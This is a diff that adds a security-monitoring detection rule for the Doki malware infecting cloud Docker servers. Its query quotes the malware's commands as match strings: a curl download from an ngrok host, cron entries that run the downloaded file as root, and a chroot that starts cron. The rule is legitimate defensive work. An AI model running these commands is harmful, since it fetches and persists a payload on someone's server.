@@ -1,0 +1,31 @@
+name: Doki infecting docker servers in the cloud
+description: |
+  'Detects techniques used by doki malware'
+severity: Medium
+enabled: false
+requiredDataConnectors:
+  - connectorId: linux
+    dataTypes:
+      - linux
+queryFrequency: 5m
+queryPeriod: 5m
+suppressionDuration: 5m
+triggerOperator: gt
+triggerThreshold: 0
+incidentConfiguration:
+  createIncident: true
+  groupingConfiguration: 
+    enabled: True
+    reopenClosedIncident: False
+    lookbackDuration: 5h
+    entitiesMatchingMethod: all
+    groupByEntities:
+tactics:
+  - Persistence
+relevantTechniques:
+query: |
+  linux 
+  | where (* contains 'curl --retry 3 -m 60 -o /tmp904c3/tmp/tmpfileb64ea3ba48a6a0abd0fe9d22511b77c6d \\\"http://04a4baaee996.ngrok.io/f/serve.1=d\\\\u0026r=64ea3ba48a6a0abd0fe9d22511b77c6d\\\"' 
+      or * contains 'echo \\\".* .* .* .* .* root sh /tmp/tmpfileb64ea3ba48a6a0abd0fe9d22511b77c6d \\\" u00e3/tmpe904c3/etc/crontab' 
+      or * contains 'echo \\\".* .* .* .* .* root sh /tmp/tmpfileb64ea3ba48a6a0abd0fe9d22511b77c6d \\\" u00e3/tmpe904c3/etc/cron.d/lm' 
+      or * contains 'chroot /tmpe904c3 sh -c \\\"cron || crond \\\"')    
